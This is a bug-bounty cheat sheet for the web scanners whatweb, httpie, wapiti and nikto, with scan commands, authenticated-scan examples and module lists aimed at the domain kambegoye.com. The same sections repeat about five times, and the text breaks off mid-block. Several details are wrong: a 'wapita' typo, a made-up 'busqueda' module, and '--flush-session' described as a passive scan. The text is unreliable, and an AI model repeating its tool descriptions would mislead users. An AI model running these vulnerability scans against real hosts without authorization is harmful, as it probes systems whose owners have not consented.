# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

